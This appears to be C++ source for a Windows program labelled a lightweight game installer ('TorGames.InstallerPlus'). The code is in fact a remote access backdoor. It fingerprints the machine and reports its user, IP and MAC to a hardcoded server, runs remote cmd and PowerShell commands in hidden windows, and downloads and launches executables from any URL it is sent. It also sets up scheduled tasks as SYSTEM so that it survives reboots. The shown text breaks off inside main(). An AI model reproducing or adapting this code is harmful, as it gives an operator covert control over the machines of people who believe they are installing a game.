// TorGames.InstallerPlus - Ultra-lightweight C++ Installer
// Target size: <200KB - No gRPC, No Protobuf, Pure Win32
// Uses simple JSON-over-TCP protocol

#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <comdef.h>
#include <Wbemidl.h>
#include <bcrypt.h>
#include <shlwapi.h>
#include <winhttp.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "winhttp.lib")

// ============== Configuration ==============
#define DEFAULT_SERVER "144.91.111.101"
#define DEFAULT_PORT 5050
#define CLIENT_TYPE "INSTALLER"
#define CLIENT_VERSION "1.0.0"
#define HEARTBEAT_INTERVAL 10000
#define RECONNECT_DELAY 5000
#define BUFFER_SIZE 8192

// ============== Globals ==============
static volatile BOOL g_running = TRUE;
static char g_serverHost[256] = DEFAULT_SERVER;
static int g_serverPort = DEFAULT_PORT;
static DWORD g_startTick = 0;
static char g_clientId[128] = {0};
static char g_logPath[MAX_PATH] = {0};

// ============== Logging ==============
void Log(const char* fmt, ...) {
    char buf[1024];
    va_list args;
    va_start(args, fmt);
    vsnprintf(buf, sizeof(buf), fmt, args);
    va_end(args);

    SYSTEMTIME st;
    GetLocalTime(&st);
    printf("[%02d:%02d:%02d] %s\n", st.wHour, st.wMinute, st.wSecond, buf);

    if (g_logPath[0]) {
        FILE* f = fopen(g_logPath, "a");
        if (f) {
            fprintf(f, "[%02d:%02d:%02d] %s\n", st.wHour, st.wMinute, st.wSecond, buf);
            fclose(f);
        }
    }
}

// ============== Simple JSON Builder ==============
typedef struct {
    char* buf;
    int len;
    int cap;
} JsonBuilder;

void jb_init(JsonBuilder* jb, char* buf, int cap) {
    jb->buf = buf;
    jb->len = 0;
    jb->cap = cap;
    jb->buf[0] = '\0';
}

void jb_append(JsonBuilder* jb, const char* s) {
    int slen = (int)strlen(s);
    if (jb->len + slen < jb->cap) {
        memcpy(jb->buf + jb->len, s, slen + 1);
        jb->len += slen;
    }
}

void jb_str(JsonBuilder* jb, const char* key, const char* val) {
    char tmp[512];
    snprintf(tmp, sizeof(tmp), "\"%s\":\"%s\",", key, val ? val : "");
    jb_append(jb, tmp);
}

void jb_int(JsonBuilder* jb, const char* key, long long val) {
    char tmp[128];
    snprintf(tmp, sizeof(tmp), "\"%s\":%lld,", key, val);
    jb_append(jb, tmp);
}

void jb_bool(JsonBuilder* jb, const char* key, BOOL val) {
    char tmp[64];
    snprintf(tmp, sizeof(tmp), "\"%s\":%s,", key, val ? "true" : "false");
    jb_append(jb, tmp);
}

void jb_end(JsonBuilder* jb) {
    if (jb->len > 0 && jb->buf[jb->len - 1] == ',') {
        jb->buf[jb->len - 1] = '\0';
        jb->len--;
    }
}

// ============== Simple JSON Parser ==============
const char* json_get_str(const char* json, const char* key, char* out, int outLen) {
    char pattern[128];
    snprintf(pattern, sizeof(pattern), "\"%s\":\"", key);
    const char* start = strstr(json, pattern);
    if (!start) return NULL;
    start += strlen(pattern);
    const char* end = strchr(start, '"');
    if (!end) return NULL;
    int len = (int)(end - start);
    if (len >= outLen) len = outLen - 1;
    memcpy(out, start, len);
    out[len] = '\0';
    return out;
}

long long json_get_int(const char* json, const char* key) {
    char pattern[128];
    snprintf(pattern, sizeof(pattern), "\"%s\":", key);
    const char* start = strstr(json, pattern);
    if (!start) return 0;
    start += strlen(pattern);
    return atoll(start);
}

BOOL json_get_bool(const char* json, const char* key) {
    char pattern[128];
    snprintf(pattern, sizeof(pattern), "\"%s\":true", key);
    return strstr(json, pattern) != NULL;
}

// ============== WMI Helper ==============
char* GetWmiValue(const wchar_t* wmiClass, const wchar_t* prop, char* out, int outLen) {
    out[0] = '\0';
    IWbemLocator* loc = NULL;
    IWbemServices* svc = NULL;
    IEnumWbemClassObject* enumer = NULL;
    IWbemClassObject* obj = NULL;
    ULONG ret = 0;

    HRESULT hr = CoCreateInstance(CLSID_WbemLocator, NULL, CLSCTX_INPROC_SERVER,
                                  IID_IWbemLocator, (void**)&loc);
    if (FAILED(hr)) goto done;

    hr = loc->ConnectServer(_bstr_t(L"ROOT\\CIMV2"), NULL, NULL, NULL,
                            0, NULL, NULL, &svc);
    if (FAILED(hr)) goto done;

    CoSetProxyBlanket(svc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
                      RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);

    wchar_t query[256];
    swprintf(query, 256, L"SELECT %s FROM %s", prop, wmiClass);

    hr = svc->ExecQuery(_bstr_t(L"WQL"), _bstr_t(query),
        WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &enumer);
    if (FAILED(hr)) goto done;

    if (SUCCEEDED(enumer->Next(WBEM_INFINITE, 1, &obj, &ret)) && ret) {
        VARIANT v;
        VariantInit(&v);
        if (SUCCEEDED(obj->Get(prop, 0, &v, NULL, NULL)) && v.vt == VT_BSTR) {
            WideCharToMultiByte(CP_UTF8, 0, v.bstrVal, -1, out, outLen, NULL, NULL);
        }
        VariantClear(&v);
        obj->Release();
    }

done:
    if (enumer) enumer->Release();
    if (svc) svc->Release();
    if (loc) loc->Release();
    return out[0] ? out : strcpy(out, "UNKNOWN");
}

// ============== Hardware Fingerprint ==============
void GetMacAddress(char* out, int len) {
    out[0] = '\0';
    ULONG bufLen = 0;
    GetAdaptersAddresses(AF_UNSPEC, 0, NULL, NULL, &bufLen);
    if (bufLen == 0) { strcpy(out, "000000000000"); return; }

    IP_ADAPTER_ADDRESSES* addrs = (IP_ADAPTER_ADDRESSES*)malloc(bufLen);
    if (GetAdaptersAddresses(AF_UNSPEC, 0, NULL, addrs, &bufLen) == NO_ERROR) {
        for (IP_ADAPTER_ADDRESSES* a = addrs; a; a = a->Next) {
            if (a->OperStatus == IfOperStatusUp && a->IfType != IF_TYPE_SOFTWARE_LOOPBACK && a->PhysicalAddressLength == 6) {
                snprintf(out, len, "%02X%02X%02X%02X%02X%02X",
                    a->PhysicalAddress[0], a->PhysicalAddress[1], a->PhysicalAddress[2],
                    a->PhysicalAddress[3], a->PhysicalAddress[4], a->PhysicalAddress[5]);
                break;
            }
        }
    }
    free(addrs);
    if (!out[0]) strcpy(out, "000000000000");
}

void Sha256(const char* in, char* out) {
    BCRYPT_ALG_HANDLE alg = NULL;
    BCRYPT_HASH_HANDLE hash = NULL;
    BYTE hashBytes[32];

    BCryptOpenAlgorithmProvider(&alg, BCRYPT_SHA256_ALGORITHM, NULL, 0);
    BCryptCreateHash(alg, &hash, NULL, 0, NULL, 0, 0);
    BCryptHashData(hash, (PUCHAR)in, (ULONG)strlen(in), 0);
    BCryptFinishHash(hash, hashBytes, 32, 0);
    BCryptDestroyHash(hash);
    BCryptCloseAlgorithmProvider(alg, 0);

    for (int i = 0; i < 32; i++) {
        sprintf(out + i * 2, "%02x", hashBytes[i]);
    }
}

void GenerateClientId(char* out) {
    char cpuId[64], biosSerial[64], mbSerial[64], mac[16];
    char combined[512];

    GetWmiValue(L"Win32_Processor", L"ProcessorId", cpuId, sizeof(cpuId));
    GetWmiValue(L"Win32_BIOS", L"SerialNumber", biosSerial, sizeof(biosSerial));
    GetWmiValue(L"Win32_BaseBoard", L"SerialNumber", mbSerial, sizeof(mbSerial));
    GetMacAddress(mac, sizeof(mac));

    snprintf(combined, sizeof(combined), "%s|%s|%s|%s", cpuId, biosSerial, mbSerial, mac);
    Sha256(combined, out);
}

// ============== System Info ==============
void GetMachineName(char* out, int len) {
    DWORD size = len;
    if (!GetComputerNameA(out, &size)) strcpy(out, "UNKNOWN");
}

void GetUsername(char* out, int len) {
    DWORD size = len;
    if (!GetUserNameA(out, &size)) strcpy(out, "UNKNOWN");
}

void GetOsVersion(char* out, int len) {
    typedef NTSTATUS(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (ntdll) {
        RtlGetVersionPtr fn = (RtlGetVersionPtr)GetProcAddress(ntdll, "RtlGetVersion");
        if (fn) {
            RTL_OSVERSIONINFOW v = {sizeof(v)};
            if (fn(&v) == 0) {
                snprintf(out, len, "Windows %lu.%lu.%lu", v.dwMajorVersion, v.dwMinorVersion, v.dwBuildNumber);
                return;
            }
        }
    }
    strcpy(out, "Windows");
}

const char* GetArch() {
    SYSTEM_INFO si;
    GetNativeSystemInfo(&si);
    switch (si.wProcessorArchitecture) {
        case PROCESSOR_ARCHITECTURE_AMD64: return "x64";
        case PROCESSOR_ARCHITECTURE_ARM64: return "ARM64";
        default: return "x86";
    }
}

int GetCpuCount() {
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    return si.dwNumberOfProcessors;
}

long long GetTotalMemory() {
    MEMORYSTATUSEX m = {sizeof(m)};
    GlobalMemoryStatusEx(&m);
    return m.ullTotalPhys;
}

long long GetAvailMemory() {
    MEMORYSTATUSEX m = {sizeof(m)};
    GlobalMemoryStatusEx(&m);
    return m.ullAvailPhys;
}

void GetLocalIp(char* out, int len) {
    char hostname[256];
    if (gethostname(hostname, sizeof(hostname)) == 0) {
        struct hostent* h = gethostbyname(hostname);
        if (h && h->h_addr_list[0]) {
            struct in_addr addr;
            memcpy(&addr, h->h_addr_list[0], sizeof(addr));
            strncpy(out, inet_ntoa(addr), len);
            return;
        }
    }
    strcpy(out, "0.0.0.0");
}

// ============== Command Execution ==============
typedef struct {
    BOOL success;
    int exitCode;
    char output[4096];
    char error[1024];
} CmdResult;

CmdResult ExecuteCommand(const char* cmd, const char* shell, int timeout) {
    CmdResult r = {0};
    SECURITY_ATTRIBUTES sa = {sizeof(sa), NULL, TRUE};
    HANDLE hOutR, hOutW, hErrR, hErrW;

    if (!CreatePipe(&hOutR, &hOutW, &sa, 0) || !CreatePipe(&hErrR, &hErrW, &sa, 0)) {
        strcpy(r.error, "Pipe creation failed");
        return r;
    }
    SetHandleInformation(hOutR, HANDLE_FLAG_INHERIT, 0);
    SetHandleInformation(hErrR, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si = {sizeof(si)};
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdOutput = hOutW;
    si.hStdError = hErrW;
    si.wShowWindow = SW_HIDE;

    char cmdLine[2048];
    snprintf(cmdLine, sizeof(cmdLine), "%s %s", shell, cmd);

    PROCESS_INFORMATION pi = {0};
    if (!CreateProcessA(NULL, cmdLine, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        strcpy(r.error, "Process creation failed");
        CloseHandle(hOutR); CloseHandle(hOutW);
        CloseHandle(hErrR); CloseHandle(hErrW);
        return r;
    }

    CloseHandle(hOutW);
    CloseHandle(hErrW);

    if (WaitForSingleObject(pi.hProcess, timeout * 1000) == WAIT_TIMEOUT) {
        TerminateProcess(pi.hProcess, 1);
        strcpy(r.error, "Timeout");
    } else {
        DWORD exitCode, bytesRead;
        GetExitCodeProcess(pi.hProcess, &exitCode);
        r.exitCode = exitCode;
        r.success = (exitCode == 0);
        ReadFile(hOutR, r.output, sizeof(r.output) - 1, &bytesRead, NULL);
        r.output[bytesRead] = '\0';
    }

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hOutR);
    CloseHandle(hErrR);
    return r;
}

// ============== Task Scheduler ==============
BOOL CreateClientStartupTask(const char* exePath) {
    char cmd[1024];
    snprintf(cmd, sizeof(cmd),
        "schtasks.exe /Create /TN \"\\TorGames\\TorGames Client\" "
        "/TR \"\\\"%s\\\"\" /SC ONSTART /DELAY 0000:30 /RU SYSTEM /RL HIGHEST /F",
        exePath);

    CmdResult r = ExecuteCommand(cmd, "cmd.exe /c", 15);
    if (r.success) return TRUE;

    // Fallback to user task
    snprintf(cmd, sizeof(cmd),
        "schtasks.exe /Create /TN \"\\TorGames\\TorGames Client\" "
        "/TR \"\\\"%s\\\"\" /SC ONLOGON /F", exePath);
    r = ExecuteCommand(cmd, "cmd.exe /c", 15);
    return r.success;
}

BOOL RemoveClientStartupTask() {
    CmdResult r = ExecuteCommand("schtasks.exe /Delete /TN \"\\TorGames\\TorGames Client\" /F", "cmd.exe /c", 15);
    return r.success;
}

// Create startup task for the installer itself (to persist across reboots until client takes over)
BOOL CreateInstallerStartupTask() {
    char exePath[MAX_PATH];
    if (!GetModuleFileNameA(NULL, exePath, MAX_PATH)) {
        Log("Failed to get installer exe path");
        return FALSE;
    }

    Log("Creating installer startup task...");

    char cmd[1024];
    // Try admin-level task first (SYSTEM account, runs at boot)
    snprintf(cmd, sizeof(cmd),
        "schtasks.exe /Create /TN \"\\TorGames\\TorGames Installer\" "
        "/TR \"\\\"%s\\\"\" /SC ONSTART /DELAY 0000:15 /RU SYSTEM /RL HIGHEST /F",
        exePath);

    CmdResult r = ExecuteCommand(cmd, "cmd.exe /c", 15);
    if (r.success) {
        Log("Installer startup task created (SYSTEM/ONSTART)");
        return TRUE;
    }

    // Fallback to user task with ONLOGON
    snprintf(cmd, sizeof(cmd),
        "schtasks.exe /Create /TN \"\\TorGames\\TorGames Installer\" "
        "/TR \"\\\"%s\\\"\" /SC ONLOGON /F",
        exePath);

    r = ExecuteCommand(cmd, "cmd.exe /c", 15);
    if (r.success) {
        Log("Installer startup task created (User/ONLOGON)");
        return TRUE;
    }

    Log("Failed to create installer startup task");
    return FALSE;
}

BOOL RemoveInstallerStartupTask() {
    CmdResult r = ExecuteCommand("schtasks.exe /Delete /TN \"\\TorGames\\TorGames Installer\" /F", "cmd.exe /c", 15);
    return r.success;
}

// ============== HTTP Download ==============
BOOL DownloadFile(const char* url, const char* destPath) {
    Log("Downloading: %s", url);
    Log("Destination: %s", destPath);

    // Parse URL
    wchar_t wUrl[512];
    MultiByteToWideChar(CP_UTF8, 0, url, -1, wUrl, 512);

    URL_COMPONENTSW urlComp = {0};
    urlComp.dwStructSize = sizeof(urlComp);
    wchar_t hostName[256] = {0};
    wchar_t urlPath[512] = {0};
    urlComp.lpszHostName = hostName;
    urlComp.dwHostNameLength = 256;
    urlComp.lpszUrlPath = urlPath;
    urlComp.dwUrlPathLength = 512;

    if (!WinHttpCrackUrl(wUrl, 0, 0, &urlComp)) {
        Log("Failed to parse URL: %lu", GetLastError());
        return FALSE;
    }

    BOOL isHttps = (urlComp.nScheme == INTERNET_SCHEME_HTTPS);
    INTERNET_PORT port = urlComp.nPort ? urlComp.nPort : (isHttps ? 443 : 80);

    // Open session
    HINTERNET hSession = WinHttpOpen(L"TorGames.InstallerPlus/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) {
        Log("WinHttpOpen failed: %lu", GetLastError());
        return FALSE;
    }

    // Connect
    HINTERNET hConnect = WinHttpConnect(hSession, hostName, port, 0);
    if (!hConnect) {
        Log("WinHttpConnect failed: %lu", GetLastError());
        WinHttpCloseHandle(hSession);
        return FALSE;
    }

    // Create request
    DWORD flags = isHttps ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", urlPath, NULL,
        WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!hRequest) {
        Log("WinHttpOpenRequest failed: %lu", GetLastError());
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return FALSE;
    }

    // Send request
    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
            WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
        Log("WinHttpSendRequest failed: %lu", GetLastError());
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return FALSE;
    }

    // Receive response
    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        Log("WinHttpReceiveResponse failed: %lu", GetLastError());
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return FALSE;
    }

    // Check status code
    DWORD statusCode = 0;
    DWORD statusSize = sizeof(statusCode);
    WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &statusSize, WINHTTP_NO_HEADER_INDEX);

    if (statusCode != 200) {
        Log("HTTP error: %lu", statusCode);
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return FALSE;
    }

    // Open output file
    HANDLE hFile = CreateFileA(destPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        Log("Failed to create file: %lu", GetLastError());
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return FALSE;
    }

    // Read and write data
    DWORD bytesRead = 0;
    DWORD totalBytes = 0;
    char buffer[8192];
    BOOL success = TRUE;

    while (WinHttpReadData(hRequest, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        DWORD bytesWritten;
        if (!WriteFile(hFile, buffer, bytesRead, &bytesWritten, NULL)) {
            Log("Failed to write file: %lu", GetLastError());
            success = FALSE;
            break;
        }
        totalBytes += bytesRead;
    }

    CloseHandle(hFile);
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    if (success) {
        Log("Downloaded %lu bytes", totalBytes);
    } else {
        DeleteFileA(destPath);
    }

    return success;
}

// Download and run an executable (for updates/client installation)
CmdResult DoDownloadAndRun(const char* url, const char* targetDir) {
    CmdResult r = {0};

    // Determine target directory
    char target[MAX_PATH];
    if (targetDir && targetDir[0]) {
        strcpy(target, targetDir);
    } else {
        char pf[MAX_PATH];
        ExpandEnvironmentStringsA("%ProgramFiles%", pf, MAX_PATH);
        snprintf(target, sizeof(target), "%s\\TorGames", pf);
    }

    // Create directory (and parent directories if needed)
    char parentDir[MAX_PATH];
    strcpy(parentDir, target);

    // Create all parent directories
    for (char* p = parentDir + 3; *p; p++) {  // Skip "C:\"
        if (*p == '\\' || *p == '/') {
            *p = '\0';
            CreateDirectoryA(parentDir, NULL);
            *p = '\\';
        }
    }
    CreateDirectoryA(target, NULL);

    // Determine filename from URL or use default
    const char* filename = strrchr(url, '/');
    filename = filename ? filename + 1 : "TorGames.Client.exe";

    // Remove query string if present
    char cleanFilename[256];
    strncpy(cleanFilename, filename, sizeof(cleanFilename) - 1);
    cleanFilename[sizeof(cleanFilename) - 1] = '\0';
    char* query = strchr(cleanFilename, '?');
    if (query) *query = '\0';

    // If filename doesn't end with .exe, use default name
    // This handles URLs like /download/latest
    if (strlen(cleanFilename) < 4 || _stricmp(cleanFilename + strlen(cleanFilename) - 4, ".exe") != 0) {
        strcpy(cleanFilename, "TorGames.Client.exe");
    }

    char destPath[MAX_PATH];
    snprintf(destPath, sizeof(destPath), "%s\\%s", target, cleanFilename);

    // Download
    if (!DownloadFile(url, destPath)) {
        snprintf(r.error, sizeof(r.error), "Download failed");
        return r;
    }

    // Create startup task for the downloaded client
    CreateClientStartupTask(destPath);

    // Remove installer startup task since client is now installed
    RemoveInstallerStartupTask();

    // Launch the downloaded executable
    STARTUPINFOA si = {sizeof(si)};
    PROCESS_INFORMATION pi;
    if (CreateProcessA(destPath, NULL, NULL, NULL, FALSE, 0, NULL, target, &si, &pi)) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        Log("Launched: %s", destPath);
    } else {
        Log("Failed to launch: %lu", GetLastError());
    }

    r.success = TRUE;
    snprintf(r.output, sizeof(r.output), "Downloaded and installed to %s", destPath);
    return r;
}

// ============== Install/Uninstall ==============
CmdResult DoInstall(const char* source, const char* targetDir) {
    CmdResult r = {0};
    char target[MAX_PATH], clientPath[MAX_PATH];

    if (targetDir[0]) {
        strcpy(target, targetDir);
    } else {
        char pf[MAX_PATH];
        ExpandEnvironmentStringsA("%ProgramFiles%", pf, MAX_PATH);
        snprintf(target, sizeof(target), "%s\\TorGames", pf);
    }

    CreateDirectoryA(target, NULL);
    snprintf(clientPath, sizeof(clientPath), "%s\\TorGames.Client.exe", target);

    if (!CopyFileA(source, clientPath, FALSE)) {
        snprintf(r.error, sizeof(r.error), "Copy failed: %lu", GetLastError());
        return r;
    }

    CreateClientStartupTask(clientPath);

    // Remove installer startup task since client is now installed
    RemoveInstallerStartupTask();

    // Launch
    STARTUPINFOA si = {sizeof(si)};
    PROCESS_INFORMATION pi;
    if (CreateProcessA(clientPath, NULL, NULL, NULL, FALSE, 0, NULL, target, &si, &pi)) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    r.success = TRUE;
    snprintf(r.output, sizeof(r.output), "Installed to %s", target);
    return r;
}

CmdResult DoUninstall(const char* targetDir) {
    CmdResult r = {0};
    char target[MAX_PATH];

    if (targetDir[0]) {
        strcpy(target, targetDir);
    } else {
        char pf[MAX_PATH];
        ExpandEnvironmentStringsA("%ProgramFiles%", pf, MAX_PATH);
        snprintf(target, sizeof(target), "%s\\TorGames", pf);
    }

    RemoveClientStartupTask();
    ExecuteCommand("taskkill /F /IM TorGames.Client.exe", "cmd.exe /c", 5);
    Sleep(1000);

    char cmd[512];
    snprintf(cmd, sizeof(cmd), "rmdir /s /q \"%s\"", target);
    ExecuteCommand(cmd, "cmd.exe /c", 10);

    r.success = TRUE;
    snprintf(r.output, sizeof(r.output), "Uninstalled from %s", target);
    return r;
}

// ============== Network Protocol ==============
// Message format: 4-byte length (big-endian) + JSON payload

BOOL SendMsg(SOCKET s, const char* json) {
    int len = (int)strlen(json);
    unsigned char header[4] = {
        (len >> 24) & 0xFF, (len >> 16) & 0xFF,
        (len >> 8) & 0xFF, len & 0xFF
    };
    if (send(s, (char*)header, 4, 0) != 4) return FALSE;
    if (send(s, json, len, 0) != len) return FALSE;
    return TRUE;
}

int RecvMsg(SOCKET s, char* buf, int bufLen, int timeoutMs) {
    fd_set fds;
    struct timeval tv = {timeoutMs / 1000, (timeoutMs % 1000) * 1000};
    FD_ZERO(&fds);
    FD_SET(s, &fds);

    if (select((int)s + 1, &fds, NULL, NULL, &tv) <= 0) return 0;

    unsigned char header[4];
    if (recv(s, (char*)header, 4, MSG_WAITALL) != 4) return -1;

    int len = (header[0] << 24) | (header[1] << 16) | (header[2] << 8) | header[3];
    if (len <= 0 || len >= bufLen) return -1;

    int received = 0;
    while (received < len) {
        int r = recv(s, buf + received, len - received, 0);
        if (r <= 0) return -1;
        received += r;
    }
    buf[len] = '\0';
    return len;
}

// ============== Build Messages ==============
void BuildRegistration(char* buf, int bufLen) {
    char machine[64], user[64], os[64], ip[32], mac[16];
    GetMachineName(machine, sizeof(machine));
    GetUsername(user, sizeof(user));
    GetOsVersion(os, sizeof(os));
    GetLocalIp(ip, sizeof(ip));
    GetMacAddress(mac, sizeof(mac));

    JsonBuilder jb;
    jb_init(&jb, buf, bufLen);
    jb_append(&jb, "{\"type\":\"registration\",");
    jb_str(&jb, "clientId", g_clientId);
    jb_str(&jb, "clientType", CLIENT_TYPE);
    jb_str(&jb, "machineName", machine);
    jb_str(&jb, "osVersion", os);
    jb_str(&jb, "osArch", GetArch());
    jb_int(&jb, "cpuCount", GetCpuCount());
    jb_int(&jb, "totalMemory", GetTotalMemory());
    jb_str(&jb, "username", user);
    jb_str(&jb, "clientVersion", CLIENT_VERSION);
    jb_str(&jb, "ipAddress", ip);
    jb_str(&jb, "macAddress", mac);
    jb_end(&jb);
    jb_append(&jb, "}");
}

void BuildHeartbeat(char* buf, int bufLen) {
    DWORD uptime = (GetTickCount() - g_startTick) / 1000;

    JsonBuilder jb;
    jb_init(&jb, buf, bufLen);
    jb_append(&jb, "{\"type\":\"heartbeat\",");
    jb_str(&jb, "clientId", g_clientId);
    jb_int(&jb, "uptime", uptime);
    jb_int(&jb, "availMemory", GetAvailMemory());
    jb_end(&jb);
    jb_append(&jb, "}");
}

void BuildCommandResult(char* buf, int bufLen, const char* cmdId, CmdResult* r) {
    // Escape output for JSON
    char escaped[4096] = {0};
    const char* src = r->output;
    char* dst = escaped;
    while (*src && dst < escaped + sizeof(escaped) - 2) {
        if (*src == '"' || *src == '\\') *dst++ = '\\';
        else if (*src == '\n') { *dst++ = '\\'; *dst++ = 'n'; src++; continue; }
        else if (*src == '\r') { src++; continue; }
        *dst++ = *src++;
    }
    *dst = '\0';

    JsonBuilder jb;
    jb_init(&jb, buf, bufLen);
    jb_append(&jb, "{\"type\":\"result\",");
    jb_str(&jb, "clientId", g_clientId);
    jb_str(&jb, "commandId", cmdId);
    jb_bool(&jb, "success", r->success);
    jb_int(&jb, "exitCode", r->exitCode);
    jb_str(&jb, "stdout", escaped);
    jb_str(&jb, "error", r->error);
    jb_end(&jb);
    jb_append(&jb, "}");
}

// ============== Handle Command ==============
void HandleCommand(SOCKET s, const char* json) {
    char cmdId[64], cmdType[32], cmdText[1024];
    json_get_str(json, "commandId", cmdId, sizeof(cmdId));
    json_get_str(json, "commandType", cmdType, sizeof(cmdType));
    json_get_str(json, "commandText", cmdText, sizeof(cmdText));
    int timeout = (int)json_get_int(json, "timeout");
    if (timeout <= 0) timeout = 300;

    Log("Command: %s (ID: %s)", cmdType, cmdId);

    CmdResult r = {0};

    // Convert to lowercase
    for (char* p = cmdType; *p; p++) *p = tolower(*p);

    if (strcmp(cmdType, "shell") == 0 || strcmp(cmdType, "cmd") == 0) {
        r = ExecuteCommand(cmdText, "cmd.exe /c", timeout);
    }
    else if (strcmp(cmdType, "powershell") == 0 || strcmp(cmdType, "ps") == 0) {
        r = ExecuteCommand(cmdText, "powershell.exe -Command", timeout);
    }
    else if (strcmp(cmdType, "install") == 0) {
        char source[512] = {0}, target[512] = {0};
        char* space = strchr(cmdText, ' ');
        if (space) {
            *space = '\0';
            strcpy(source, cmdText);
            strcpy(target, space + 1);
        } else {
            strcpy(source, cmdText);
        }
        r = DoInstall(source, target);
    }
    else if (strcmp(cmdType, "uninstall") == 0) {
        r = DoUninstall(cmdText);
    }
    else if (strcmp(cmdType, "download") == 0 || strcmp(cmdType, "update") == 0) {
        // Download and run - cmdText is the URL, optionally followed by target dir
        char url[512] = {0}, target[512] = {0};
        char* space = strchr(cmdText, ' ');
        if (space) {
            *space = '\0';
            strcpy(url, cmdText);
            strcpy(target, space + 1);
        } else {
            strcpy(url, cmdText);
        }
        r = DoDownloadAndRun(url, target);
    }
    else {
        r.success = FALSE;
        snprintf(r.error, sizeof(r.error), "Unknown command: %s", cmdType);
    }

    char buf[BUFFER_SIZE];
    BuildCommandResult(buf, sizeof(buf), cmdId, &r);
    SendMsg(s, buf);
}

// ============== Main Connection Loop ==============
void RunClient() {
    while (g_running) {
        Log("Connecting to %s:%d...", g_serverHost, g_serverPort);

        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) {
            Log("Socket creation failed");
            Sleep(RECONNECT_DELAY);
            continue;
        }

        struct sockaddr_in addr = {0};
        addr.sin_family = AF_INET;
        addr.sin_port = htons(g_serverPort);
        addr.sin_addr.s_addr = inet_addr(g_serverHost);

        if (addr.sin_addr.s_addr == INADDR_NONE) {
            struct hostent* h = gethostbyname(g_serverHost);
            if (h) memcpy(&addr.sin_addr, h->h_addr, h->h_length);
        }

        if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) != 0) {
            Log("Connection failed");
            closesocket(sock);
            Sleep(RECONNECT_DELAY);
            continue;
        }

        Log("Connected!");

        // Send registration
        char buf[BUFFER_SIZE];
        BuildRegistration(buf, sizeof(buf));
        if (!SendMsg(sock, buf)) {
            Log("Failed to send registration");
            closesocket(sock);
            Sleep(RECONNECT_DELAY);
            continue;
        }

        // Main loop
        DWORD lastHeartbeat = GetTickCount();
        while (g_running) {
            // Check for incoming messages
            int len = RecvMsg(sock, buf, sizeof(buf), 100);
            if (len < 0) {
                Log("Connection lost");
                break;
            }
            if (len > 0) {
                char type[32];
                json_get_str(buf, "type", type, sizeof(type));
                if (strcmp(type, "command") == 0) {
                    HandleCommand(sock, buf);
                } else if (strcmp(type, "ping") == 0) {
                    Log("Ping received");
                }
            }

            // Send heartbeat
            if (GetTickCount() - lastHeartbeat >= HEARTBEAT_INTERVAL) {
                BuildHeartbeat(buf, sizeof(buf));
                if (!SendMsg(sock, buf)) {
                    Log("Heartbeat failed");
                    break;
                }
                lastHeartbeat = GetTickCount();
            }
        }

        closesocket(sock);
        if (g_running) {
            Log("Reconnecting in %d seconds...", RECONNECT_DELAY / 1000);
            Sleep(RECONNECT_DELAY);
        }
    }
}

// ============== Console Handler ==============
BOOL WINAPI ConsoleHandler(DWORD signal) {
    if (signal == CTRL_C_EVENT || signal == CTRL_BREAK_EVENT) {
        Log("Shutdown signal");
        g_running = FALSE;
        return TRUE;
    }
    return FALSE;
}

// ============== Main ==============
int main(int argc, char* argv[]) {
    g_startTick = GetTickCount();

    // Log path
    char temp[MAX_PATH];
    GetTempPathA(MAX_PATH, temp);
    snprintf(g_logPath, sizeof(g_logPath), "%sTorGames_InstallerPlus.log", temp);

    Log("========================================");
    Log("TorGames.InstallerPlus starting...");

